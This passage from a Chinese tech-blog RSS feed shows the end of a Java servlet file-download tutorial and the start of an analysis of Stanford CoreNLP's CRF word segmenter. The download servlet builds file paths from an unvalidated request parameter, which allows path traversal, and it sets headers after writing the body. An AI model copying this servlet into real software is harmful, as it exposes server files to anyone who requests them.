        String filePath = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getServletContext&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getRealPath&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/uploadFile&quot;&lt;/span&gt;);

        Map map = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; HashMap();

        &lt;span class=&quot;co&quot;&gt;//使用递归来得到所有的文件，并添加到Map集合中&lt;/span&gt;
        &lt;span class=&quot;fu&quot;&gt;getAllFiles&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; File(filePath), map);

        request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;map&quot;&lt;/span&gt;, map);
        request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/listFile.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);



    }

    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;getAllFiles&lt;/span&gt;(File filePath, Map map) {

        &lt;span class=&quot;co&quot;&gt;//如果不是文件，那么它就是文件夹&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!filePath.&lt;span class=&quot;fu&quot;&gt;isFile&lt;/span&gt;()) {

            &lt;span class=&quot;co&quot;&gt;//列出文件夹下所有的文件（可能是文件，可能是文件夹）&lt;/span&gt;
            File[] files = filePath.&lt;span class=&quot;fu&quot;&gt;listFiles&lt;/span&gt;();
            &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; (File file : files) {

                &lt;span class=&quot;co&quot;&gt;//得到的文件（或者是文件夹）再对其进行判断&lt;/span&gt;
                &lt;span class=&quot;fu&quot;&gt;getAllFiles&lt;/span&gt;(file, map);
            }
        } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
            &lt;span class=&quot;co&quot;&gt;//进入到else语句了，肯定是文件了&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//得到文件名&lt;/span&gt;
            String fileName = filePath.&lt;span class=&quot;fu&quot;&gt;getName&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;substring&lt;/span&gt;(filePath.&lt;span class=&quot;fu&quot;&gt;getName&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;lastIndexOf&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;_&quot;&lt;/span&gt;) + &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);

            &lt;span class=&quot;co&quot;&gt;//我们将文件全名作为key，文件名作为value保存在map集合中&lt;/span&gt;
            map.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(filePath.&lt;span class=&quot;fu&quot;&gt;getName&lt;/span&gt;(), fileName);

        }

    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;在JSP页面中显示可以下载的文件&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode jsp&quot;&gt;
&lt;code class=&quot;sourceCode jsp&quot;&gt;


&lt;span class=&quot;kw&quot;&gt;&amp;lt;c:forEach&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; items&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;${map}&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; var&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;me&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;kw&quot;&gt;&amp;lt;c:url&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; var&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;/DownFileServlet&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;c:param&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;fileName&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;${me.key}&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/c:param&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/c:url&amp;gt;&lt;/span&gt;
    ${me.value}&amp;lt;a&lt;span class=&quot;ot&quot;&gt; href&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;${url}&lt;span class=&quot;dt&quot;&gt;&quot;&lt;/span&gt;&amp;gt;下载！&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;

&lt;span class=&quot;kw&quot;&gt;&amp;lt;/c:forEach&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;实现下载的Servlet&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;21&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;    &lt;span class=&quot;kw&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;doPost&lt;/span&gt;(HttpServletRequest request, HttpServletResponse response) &lt;span class=&quot;kw&quot;&gt;throws&lt;/span&gt; ServletException, IOException {

        &lt;span class=&quot;co&quot;&gt;//得到文件的全名&lt;/span&gt;
        String fileName = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;fileName&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//如果是中文数据，需要转码。&lt;/span&gt;
        fileName = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; String(fileName.&lt;span class=&quot;fu&quot;&gt;getBytes&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;ISO8859-1&quot;&lt;/span&gt;), &lt;span class=&quot;st&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//得到保存文件的位置&lt;/span&gt;
        String path = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getServletContext&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getRealPath&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/uploadFile&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//文件是通过文件名进行hashCode打散保存的，通过文件名拿到文件绝对路径&lt;/span&gt;
        String fileRealPath = &lt;span class=&quot;fu&quot;&gt;makeFilePath&lt;/span&gt;(fileName, path);
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(fileRealPath);

        &lt;span class=&quot;co&quot;&gt;//判断文件是否存在&lt;/span&gt;
        File file = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; File(fileRealPath);
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!file.&lt;span class=&quot;fu&quot;&gt;exists&lt;/span&gt;()) {
            request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;message&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;您要下载的资源不存在了！&quot;&lt;/span&gt;);
            request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/message.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; ;
        }

        &lt;span class=&quot;co&quot;&gt;//存在&lt;/span&gt;

        &lt;span class=&quot;co&quot;&gt;//读取该文件并把数据写给浏览器&lt;/span&gt;
        FileInputStream inputStream = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; FileInputStream(fileRealPath);
        &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[] bytes = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[&lt;span class=&quot;dv&quot;&gt;1024&lt;/span&gt;];
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
        &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; ((len = inputStream.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(bytes)) &amp;gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;) {
            response.&lt;span class=&quot;fu&quot;&gt;getOutputStream&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;write&lt;/span&gt;(bytes, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, len);
        }

        inputStream.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();


        &lt;span class=&quot;co&quot;&gt;//设置消息头，告诉浏览器，这是下载的文件&lt;/span&gt;
        String name = fileName.&lt;span class=&quot;fu&quot;&gt;substring&lt;/span&gt;(fileName.&lt;span class=&quot;fu&quot;&gt;lastIndexOf&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;_&quot;&lt;/span&gt;) + &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);
        response.&lt;span class=&quot;fu&quot;&gt;setHeader&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;content-disposition&quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&quot;attachment;filename=&quot;&lt;/span&gt; + URLEncoder.&lt;span class=&quot;fu&quot;&gt;encode&lt;/span&gt;(name, &lt;span class=&quot;st&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;));

    }

    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String &lt;span class=&quot;fu&quot;&gt;makeFilePath&lt;/span&gt;(String fileName, String path) {

        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; hashCode = fileName.&lt;span class=&quot;fu&quot;&gt;hashCode&lt;/span&gt;();

        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; dir1 = hashCode &amp;amp; &lt;span class=&quot;bn&quot;&gt;0xf&lt;/span&gt;;
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; dir2 = (hashCode &amp;amp; &lt;span class=&quot;bn&quot;&gt;0xf0&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;;

        String dir = path + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + dir1 + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + dir2 +&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;+ fileName;
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; dir;
    }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;效果-2&quot;&gt;效果&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327193259435?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;如果文章有错的地方欢迎指正，大家互相交流。习惯在微信看技术文章的同学，可以关注微信公众号:Java3y&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Wed, 07 Feb 2018 13:59:00 +0000</pubDate>
<dc:creator>Java3y</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Java3y/p/8428591.html</dc:identifier>
</item>
<item>
<title>开源中文分词工具探析（六）：Stanford CoreNLP - Treant</title>
<link>http://www.cnblogs.com/en-heng/p/8428504.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/en-heng/p/8428504.html</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://github.com/stanfordnlp/CoreNLP&quot;&gt;CoreNLP&lt;/a&gt;是由斯坦福大学开源的一套Java NLP工具，提供诸如：词性标注（part-of-speech (POS) tagger）、命名实体识别（named entity recognizer (NER)）、情感分析（sentiment analysis）等功能。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;【开源中文分词工具探析】系列：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6225117.html&quot;&gt;中文分词工具探析（一）：ICTCLAS (NLPIR)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6234006.html&quot;&gt;中文分词工具探析（二）：Jieba&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6274881.html&quot;&gt;中文分词工具探析（三）：Ansj&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6429355.html&quot;&gt;开源中文分词工具探析（四）：THULAC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6559327.html&quot;&gt;开源中文分词工具探析（五）：FNLP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/8428504.html&quot;&gt;开源中文分词工具探析（六）：Stanford CoreNLP&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;hr/&gt;
&lt;p&gt;CoreNLP的&lt;a href=&quot;http://nlp.stanford.edu/software/segmenter.shtml&quot;&gt;中文分词&lt;/a&gt;基于&lt;a href=&quot;http://www.cnblogs.com/en-heng/p/6214023.html&quot;&gt;CRF&lt;/a&gt;模型：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[ P_w(y|x) = \frac{exp \left( \sum_i w_i f_i(x,y) \right)}{Z_w(x)} \]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中，&lt;span class=&quot;math inline&quot;&gt;\(Z_w(x)\)&lt;/span&gt;为归一化因子，&lt;span class=&quot;math inline&quot;&gt;\(w\)&lt;/span&gt;为模型的参数，&lt;span class=&quot;math inline&quot;&gt;\(f_i(x,y)\)&lt;/span&gt;为特征函数。&lt;/p&gt;

&lt;p&gt;以下源码分析基于3.7.0版本，分词示例见&lt;code&gt;SegDemo&lt;/code&gt;类。&lt;/p&gt;
&lt;h2 id=&quot;模型&quot;&gt;模型&lt;/h2&gt;
&lt;p&gt;主要模型文件有两份，一份为词典文件&lt;code&gt;dict-chris6.ser.gz&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;co&quot;&gt;// dict-chris6.ser.gz 对应于长度为7的Set数组词典&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;// 共计词数：0+7323+125336+142252+82139+26907+39243&lt;/span&gt;
ChineseDictionary::&lt;span class=&quot;fu&quot;&gt;loadDictionary&lt;/span&gt;(String serializePath) {
    Set&amp;lt;String&amp;gt;[] dict = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; HashSet[MAX_LEXICON_LENGTH + &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;];
    &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt;= MAX_LEXICON_LENGTH; i++) {
        dict[i] = Generics.&lt;span class=&quot;fu&quot;&gt;newHashSet&lt;/span&gt;();
    }
    dict = IOUtils.&lt;span class=&quot;fu&quot;&gt;readObjectFromURLOrClasspathOrFileSystem&lt;/span&gt;(serializePath);
    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; dict;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;词典的索引值为词的长度，比如第0个词典中没有词，第1个词典为长度为1的词，第6个词典为长度为6的词。其中，第6个词典为半成词，比如，有词“《双峰》（电”、“８０年国家领”、“１８２４年英”。&lt;/p&gt;
&lt;p&gt;另一份为CRF训练模型文件&lt;code&gt;/ctb.gz&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;CRFClassifier::&lt;span class=&quot;fu&quot;&gt;loadClassifier&lt;/span&gt;(ObjectInputStream ois, Properties props) {
    Object o = ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;();
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (o &lt;span class=&quot;kw&quot;&gt;instanceof&lt;/span&gt; List) {
        labelIndices = (List&amp;lt;Index&amp;lt;CRFLabel&amp;gt;&amp;gt;) o; &lt;span class=&quot;co&quot;&gt;// label索引&lt;/span&gt;
    }
    classIndex = (Index&amp;lt;String&amp;gt;) ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 序列标注label&lt;/span&gt;
    featureIndex = (Index&amp;lt;String&amp;gt;) ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 特征&lt;/span&gt;
    flags = (SeqClassifierFlags) ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 模型配置&lt;/span&gt;

    Object featureFactory = ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 特征模板，用于生成特征&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (featureFactory &lt;span class=&quot;kw&quot;&gt;instanceof&lt;/span&gt; FeatureFactory) {
        featureFactories = Generics.&lt;span class=&quot;fu&quot;&gt;newArrayList&lt;/span&gt;();
        featureFactories.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;((FeatureFactory&amp;lt;IN&amp;gt;) featureFactory);
    }

    windowSize = ois.&lt;span class=&quot;fu&quot;&gt;readInt&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 窗口大小为2&lt;/span&gt;
    weights = (&lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt;[][]) ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// 特征+label 对应的权重&lt;/span&gt;

    Set&amp;lt;String&amp;gt; lcWords = (Set&amp;lt;String&amp;gt;) ois.&lt;span class=&quot;fu&quot;&gt;readObject&lt;/span&gt;(); &lt;span class=&quot;co&quot;&gt;// Set为空&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
        knownLCWords = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; MaxSizeConcurrentHashSet&amp;lt;&amp;gt;(lcWords);
    }

    &lt;span class=&quot;fu&quot;&gt;reinit&lt;/span&gt;();
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;不同于其他分词器采用B、M、E、S四种label来做分词，CoreNLP的中文分词label只有两种，“1”表示当前字符与前一字符连接成词，“0”则表示当前字符为另一词的开始——换言之前一字符为上一个词的结尾。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; CRFClassifier {
    classIndex: &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; edu.&lt;span class=&quot;fu&quot;&gt;stanford&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;nlp&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;util&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HashIndex&lt;/span&gt;
      [&lt;span class=&quot;st&quot;&gt;&quot;1&quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&quot;0&quot;&lt;/span&gt;]
}

&lt;span class=&quot;co&quot;&gt;// 中文分词label对应的类&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; AnswerAnnotation &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; CoreAnnotation&amp;lt;String&amp;gt;{}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;特征&quot;&gt;特征&lt;/h2&gt;
&lt;p&gt;CoreNLP的特征如下（示例）：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; CRFClassifier {
    &lt;span class=&quot;co&quot;&gt;// 特征&lt;/span&gt;
    featureIndex: &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; edu.&lt;span class=&quot;fu&quot;&gt;stanford&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;nlp&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;util&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;HashIndex&lt;/span&gt;
        size = &lt;span class=&quot;dv&quot;&gt;3408491&lt;/span&gt;
        &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;=的膀cc2|C
        &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;=身也pc|C
        &lt;span class=&quot;dv&quot;&gt;44&lt;/span&gt;=LSSLp2spscsc2s|C
        &lt;span class=&quot;dv&quot;&gt;45&lt;/span&gt;=科背p2p|C
        &lt;span class=&quot;dv&quot;&gt;46&lt;/span&gt;=迪。cc2|C
        ...
        =球-行pc2|CnC
        =音非cc2|CpC
    
    &lt;span class=&quot;co&quot;&gt;// 权重&lt;/span&gt;
    weights: &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt;[&lt;span class=&quot;dv&quot;&gt;3408491&lt;/span&gt;][&lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;]
        [[&lt;span class=&quot;fl&quot;&gt;2.2114868426005005E-5&lt;/span&gt;, -&lt;span class=&quot;fl&quot;&gt;2.2114868091546352E-5&lt;/span&gt;]...]
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;特征后缀只有3类：C, CpC, CnC，分别代表了三大类特征；均由特征模板生成：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;19&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;co&quot;&gt;// 特征模板List&lt;/span&gt;
featureFactories: ArrayList&amp;lt;FeatureFactory&amp;gt;
    &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt; = Gale2007ChineseSegmenterFeatureFactory

&lt;span class=&quot;co&quot;&gt;// 具体特征模板&lt;/span&gt;
Gale2007ChineseSegmenterFeatureFactory::&lt;span class=&quot;fu&quot;&gt;getCliqueFeatures&lt;/span&gt;() {
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (clique == cliqueC) {
        &lt;span class=&quot;fu&quot;&gt;addAllInterningAndSuffixing&lt;/span&gt;(features, &lt;span class=&quot;fu&quot;&gt;featuresC&lt;/span&gt;(cInfo, loc), &lt;span class=&quot;st&quot;&gt;&quot;C&quot;&lt;/span&gt;);
    } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (clique == cliqueCpC) {
        &lt;span class=&quot;fu&quot;&gt;addAllInterningAndSuffixing&lt;/span&gt;(features, &lt;span class=&quot;fu&quot;&gt;featuresCpC&lt;/span&gt;(cInfo, loc), &lt;span class=&quot;st&quot;&gt;&quot;CpC&quot;&lt;/span&gt;);
        &lt;span class=&quot;fu&quot;&gt;addAllInterningAndSuffixing&lt;/span&gt;(features, &lt;span class=&quot;fu&quot;&gt;featuresCnC&lt;/span&gt;(cInfo, loc - &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;), &lt;span class=&quot;st&quot;&gt;&quot;CnC&quot;&lt;/span&gt;);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;特征模板只用到了两个特征簇&lt;code&gt;cliqueC&lt;/code&gt;与&lt;code&gt;cliqueCpC&lt;/code&gt;，其中，&lt;code&gt;cliqueC&lt;/code&gt;由函数&lt;code&gt;featuresC()&lt;/code&gt;实现，&lt;code&gt;cliqueCpC&lt;/code&gt;由函数&lt;code&gt;featuresCpC()&lt;/code&gt;与&lt;code&gt;featuresCnC()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;26&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
Gale2007ChineseSegmenterFeatureFactory::&lt;span class=&quot;fu&quot;&gt;featuresC&lt;/span&gt;() {
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (flags.&lt;span class=&quot;fu&quot;&gt;useWord1&lt;/span&gt;) {
        &lt;span class=&quot;co&quot;&gt;// Unigram 特征&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charc +&lt;span class=&quot;st&quot;&gt;&quot;::c&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[0]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charc2+&lt;span class=&quot;st&quot;&gt;&quot;::c2&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[1]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp +&lt;span class=&quot;st&quot;&gt;&quot;::p&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-1]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp2 +&lt;span class=&quot;st&quot;&gt;&quot;::p2&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-2]&lt;/span&gt;

        &lt;span class=&quot;co&quot;&gt;// Bigram 特征&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charc +charc2  +&lt;span class=&quot;st&quot;&gt;&quot;::cn&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[0]c[1]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charc +charc3  +&lt;span class=&quot;st&quot;&gt;&quot;::cn2&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[0]c[2]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp +charc  +&lt;span class=&quot;st&quot;&gt;&quot;::pc&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-1]c[0]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp +charc2  +&lt;span class=&quot;st&quot;&gt;&quot;::pn&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-1]c[1]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp2 +charp  +&lt;span class=&quot;st&quot;&gt;&quot;::p2p&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-2]c[-1]&lt;/span&gt;
        features.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(charp2 +charc  +&lt;span class=&quot;st&quot;&gt;&quot;::p2c&quot;&lt;/span&gt;); &lt;span class=&quot;co&quot;&gt;// c[-2]c[0]&lt;/span&gt;
